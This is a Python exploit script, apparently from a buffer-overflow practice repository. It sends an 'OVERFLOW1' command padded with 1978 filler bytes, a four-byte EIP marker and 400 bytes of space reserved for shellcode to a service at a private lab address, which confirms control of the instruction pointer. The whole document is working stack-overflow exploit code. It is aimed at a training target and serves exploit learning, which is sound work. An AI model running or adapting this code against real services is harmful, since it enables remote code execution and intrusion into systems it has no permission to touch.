import socket
import sys

#
# opinfosec
# Eip Test Confirmation of Control of EIP
# https://github.com/opsec-infosec/BufferOverflow
#


header = "OVERFLOW1 "
filler = "A" * 1978
eip = "X" * 4
extend = "E" * 400   # Just enough to fit our payload -- Typical calc payload is ~220 Bytes :: Shell Payload is ~350 Bytes

try:
    s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
    s.connect(("192.168.100.2", 1337)) 
    buffer = header + filler + eip + extend
    s.send(buffer.encode("latin-1"))
    s.close()
    
except Exception as ex:
    print ("Error: ", ex)
    sys.exit(1)

sys.exit(0)
